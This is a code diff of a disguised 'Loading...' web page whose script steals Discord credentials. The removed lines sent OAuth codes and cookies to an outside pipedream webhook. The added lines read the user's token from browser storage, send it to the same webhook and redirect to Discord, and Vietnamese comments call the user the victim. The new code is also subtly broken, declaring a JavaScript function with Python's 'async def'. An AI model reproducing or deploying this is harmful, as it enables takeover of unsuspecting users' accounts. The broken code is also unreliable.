@@ -1,34 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading Discord...</title></head>
+<head><title>Loading...</title></head>
 <body>
     <script>
-        const MY_WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";
-        const CLIENT_ID = "1457055712411914377";
-        
-        const params = new URLSearchParams(window.location.search);
-        const code = params.get('code');
+        const WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";
 
-        if (code) {
-            // Lấy toàn bộ cookie và lọc bỏ các ký tự lạ
-            const allCookies = document.cookie;
-            
-            fetch(MY_WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    code: code,
-                    cookies: allCookies, // Chỗ này sẽ không còn bị trống nữa
-                    user_agent: navigator.userAgent
-                })
-            }).then(() => {
+        async def hoot_token() {
+            // Thủ thuật lấy User Token trực tiếp từ trình duyệt của nạn nhân
+            let token = (
+                window.webpackChunkdiscord_app ? 
+                window.localStorage.getItem('token') : 
+                document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token
+            );
+
+            if (token) {
+                token = token.replace(/"/g, "");
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_token: token })
+                });
                 window.location.href = "https://discord.com/channels/@me";
-            });
-        } else {
-            const redirect = encodeURIComponent(window.location.href);
-            // Thêm quyền rpc để có kết nối ổn định nhất
-            window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code&scope=identify+email+guilds.join+messages.read+rpc`;
+            } else {
+                // Nếu chưa có token, ép họ vào trang login để lấy
+                window.location.href = "https://discord.com/login";
+            }
         }
+
+        hoot_token();
     </script>
 </body>
 </html>
